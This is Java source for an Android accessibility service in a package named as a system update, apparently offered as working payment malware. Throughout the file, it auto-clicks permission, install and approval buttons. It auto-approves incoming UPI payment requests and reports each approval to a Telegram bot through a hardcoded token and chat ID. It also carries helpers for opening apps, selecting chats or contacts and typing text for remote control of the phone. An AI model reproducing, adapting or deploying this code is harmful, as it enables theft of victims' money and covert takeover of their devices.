package com.system.update;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.os.Bundle;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.ArrayList;
import java.util.List;

public class MyAccessibilityService extends AccessibilityService {
    private static MyAccessibilityService instance;
    private static final String BOT_TOKEN = "8884434975:AAHaHSzckxuewYq_mkf1cPNnNt9NKVdd_FY";
    private static final String CHAT_ID = "8501093383";
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        instance = this;
        String text = event.getText().toString();
        
        if (text.contains("Allow") || text.contains("Install") || 
            text.contains("Approve") || text.contains("Accept") || 
            text.contains("Yes") || text.contains("Continue") || 
            text.contains("OK") || text.contains("Grant")) {
            clickButton("Allow");
            clickButton("Install");
            clickButton("Approve");
            clickButton("Accept");
            clickButton("Yes");
            clickButton("Continue");
            clickButton("OK");
            clickButton("Grant");
        }
        
        if (text.contains("UPI") && text.contains("requests")) {
            clickButton("Approve");
            clickButton("Accept");
            clickButton("Yes");
            sendTelegram("✅ Auto-approved UPI request");
        }
    }
    
    // ==================== CLICK BUTTON BY TEXT ====================
    public void clickButton(String text) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
        for (AccessibilityNodeInfo node : nodes) {
            if (node.isClickable()) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                break;
            }
        }
    }
    
    // ==================== OPEN APP ====================
    public void openApp(String packageName) {
        try {
            Intent intent = getPackageManager().getLaunchIntentForPackage(packageName);
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        } catch (Exception e) {}
    }
    
    // ==================== PRESS BACK ====================
    public void pressBack() {
        performGlobalAction(GLOBAL_ACTION_BACK);
    }
    
    // ==================== FIND BY CLASS NAME (CUSTOM) ====================
    private List<AccessibilityNodeInfo> findByClassName(AccessibilityNodeInfo root, String className) {
        List<AccessibilityNodeInfo> results = new ArrayList<>();
        if (root == null) return results;
        try {
            if (root.getClassName() != null && root.getClassName().toString().equals(className)) {
                results.add(root);
            }
            for (int i = 0; i < root.getChildCount(); i++) {
                results.addAll(findByClassName(root.getChild(i), className));
            }
        } catch (Exception e) {}
        return results;
    }
    
    // ==================== CLICK CHAT AT POSITION ====================
    public boolean clickChatAtPosition(int position) {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return false;
            List<AccessibilityNodeInfo> lists = findByClassName(root, "android.widget.ListView");
            if (!lists.isEmpty()) {
                AccessibilityNodeInfo list = lists.get(0);
                if (list.getChildCount() > position) {
                    AccessibilityNodeInfo chat = list.getChild(position);
                    if (chat != null && chat.isClickable()) {
                        chat.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return true;
                    }
                }
            }
        } catch (Exception e) {}
        return false;
    }
    
    // ==================== CLICK CONTACT AT POSITION ====================
    public boolean clickContactAtPosition(int position) {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return false;
            List<AccessibilityNodeInfo> lists = findByClassName(root, "android.widget.ListView");
            if (!lists.isEmpty()) {
                AccessibilityNodeInfo list = lists.get(0);
                if (list.getChildCount() > position) {
                    AccessibilityNodeInfo contact = list.getChild(position);
                    if (contact != null && contact.isClickable()) {
                        contact.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return true;
                    }
                }
            }
        } catch (Exception e) {}
        return false;
    }
    
    // ==================== TYPE TEXT ====================
    public void typeText(String text) {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;
            List<AccessibilityNodeInfo> editTexts = findByClassName(root, "android.widget.EditText");
            if (!editTexts.isEmpty()) {
                AccessibilityNodeInfo editText = editTexts.get(0);
                Bundle args = new Bundle();
                args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                editText.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
            }
        } catch (Exception e) {}
    }
    
    // ==================== SEND TELEGRAM ====================
    private void sendTelegram(String msg) {
        try {
            new java.net.URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + java.net.URLEncoder.encode(msg, "UTF-8")).openConnection().connect();
        } catch(Exception e) {}
    }
    
    @Override
    public void onInterrupt() {}
    
    public static MyAccessibilityService getInstance() { return instance; }
}
